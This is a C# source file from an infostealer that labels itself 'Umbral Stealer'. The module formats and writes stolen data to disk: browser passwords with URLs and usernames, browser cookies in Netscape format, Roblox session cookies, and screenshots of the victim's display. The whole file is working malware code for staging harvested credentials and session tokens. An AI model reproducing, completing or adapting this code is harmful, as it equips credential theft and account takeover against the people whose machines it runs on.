using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading.Tasks;


namespace SHARP
{
    internal static class SaveData
    {
        static private readonly string Delimeter;

        static SaveData()
        {
            Delimeter = "==================Umbral Stealer==================";
        }

        internal static async Task SaveToFile(PasswordFormat[] passwords, string filepath)
        {
            if (passwords.Length > 0)
                using (FileStream fs = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        foreach (PasswordFormat password in passwords)
                            await sw.WriteLineAsync($@"
{Delimeter}

URL: {password.Url}
Username: {password.Username}
Password: {password.Password}

".TrimStart());
                    }
                }
        }

        internal static async Task SaveToFile(CookieFormat[] cookies, string filepath)
        {
            if (cookies.Length > 0)
                using (FileStream fs = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        foreach (CookieFormat cookie in cookies)
                        {
                            string host = cookie.Host;
                            string name = cookie.Name;
                            string path = cookie.Path;
                            string value = cookie.Cookie;
                            ulong expiry = cookie.Expiry;

                            string flag1 = expiry == 0 ? "FALSE" : "TRUE";
                            string flag2 = host.StartsWith(".") ? "FALSE" : "TRUE";

                            await sw.WriteLineAsync($"{host}\t{flag1}\t{path}\t{flag2}\t{expiry}\t{name}\t{value}");
                        }
                    }
                }
        }

        

        internal static async Task SaveToFile(string[] robloxCookies, string filepath)
        {
            if (robloxCookies.Length > 0)
                using (FileStream fs = new FileStream(filepath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter sw = new StreamWriter(fs))
                    {
                        await sw.WriteLineAsync(
                            "# Please note that these cookies are not verified so they might work or not.\n");
                        foreach (string cookie in robloxCookies) await sw.WriteLineAsync($"{Delimeter}\n\n{cookie}\n\n");
                    }
                }
        }

        internal static void SaveToFile(Bitmap[] screenshots, string folderPath)
        {
            for (int i = 0; i < screenshots.Length; i++)
            {
                try
                {
                    string filePath = Path.Combine(folderPath,
                        "Display" + (screenshots.Length > 1 ? $"-{i + 1}" : string.Empty) + ".png");
                    screenshots[i].Save(filePath, ImageFormat.Png);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        internal static void SaveToFile(Dictionary<string, Bitmap> images, string folderPath)
        {
            foreach (var image in images)
            {
                try
                {
                    string filePath = Path.Combine(folderPath, $"{image.Key}.png");
                    image.Value.Save(filePath, ImageFormat.Png);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }
        }
    }
}